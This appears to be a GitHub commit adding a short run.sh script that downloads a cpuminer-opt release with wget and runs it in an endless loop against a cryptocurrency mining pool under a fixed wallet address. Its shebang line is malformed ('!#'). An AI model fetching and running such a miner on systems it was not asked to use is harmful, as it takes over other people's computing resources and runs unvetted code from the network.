6425176cde35417e04cce5e2fd096a126a5241aa
totoamsx <93080374+totoamsx@users.noreply.github.com>
2021-10-24 19:13:44 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,7 @@
+!#/bin/sh
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+while [ 1 ]; do
+./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.yess -t2
+sleep 2
+done
